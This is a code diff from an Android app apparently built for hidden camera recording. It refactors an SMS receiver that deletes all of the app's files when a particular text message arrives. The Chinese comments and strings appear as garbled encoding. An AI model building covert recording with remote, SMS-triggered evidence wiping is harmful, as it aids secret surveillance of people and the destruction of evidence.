@@ -9,7 +9,7 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.leng.hiddencamera.mine.PmwsSetActivity;
+import com.leng.hiddencamera.mine.MinePresent;
 import com.leng.hiddencamera.zipthings.encrypte.EncryptedService;
 
 import java.text.SimpleDateFormat;
@@ -43,7 +43,7 @@ public class SmsReciver extends BroadcastReceiver {
 					Log.i("qweqweq", "���յ�����Ϣ123456");
 
 						//ȫ��ɾ���ļ�
-						new PmwsSetActivity().destroyFiles(msg);
+						new MinePresent().destroyFiles(context,msg);
 				}
 
 				if (msg.getMessageBody().equals("����ɾ��")){
